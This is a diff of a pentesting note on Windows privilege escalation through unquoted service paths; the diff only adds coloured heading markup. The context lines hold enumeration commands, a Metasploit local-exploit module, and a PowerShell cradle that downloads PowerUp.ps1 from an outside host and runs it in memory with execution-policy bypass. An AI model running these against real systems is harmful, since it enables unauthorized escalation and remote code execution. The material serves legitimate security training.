@@ -6,9 +6,9 @@ Consider the following unquoted path: C:\Program Files\Some Dir\SomeProgram.exe
 
 To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: “Files\Some” and “Dir SomeProgram.exe” Windows resolves this ambiguity by checking each of the possibilities in turn. **If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.**
 
-## detecting unquoted service paths
+## <mark style="color:red;">detecting unquoted service paths</mark>
 
-### manual method
+### <mark style="color:orange;">manual method</mark>
 
 ```
 sc query vaultsvc → query the credential manager
@@ -22,7 +22,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 
 This command finds the service name, executable path, display name of the service and auto starts in all the directories except C:\Windows (since by default there is no such service which has spaces and is unquoted in this folder). Also, we need to exclude those services that are enclosed within the double quotes.
 
-### automated with metasploit
+### <mark style="color:orange;">automated with metasploit</mark>
 
 We use Metasploit’s exploit/windows/local/trusted\_service\_path.
 
@@ -32,13 +32,13 @@ set session 1
 exploit
 ```
 
-### automated using powerup
+### <mark style="color:orange;">automated using powerup</mark>
 
 ```
 powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted"
 ```
 
-### automated with winPEAS
+### <mark style="color:orange;">automated with winPEAS</mark>
 
 Run winPEAS to check for service misconfigurations:
 
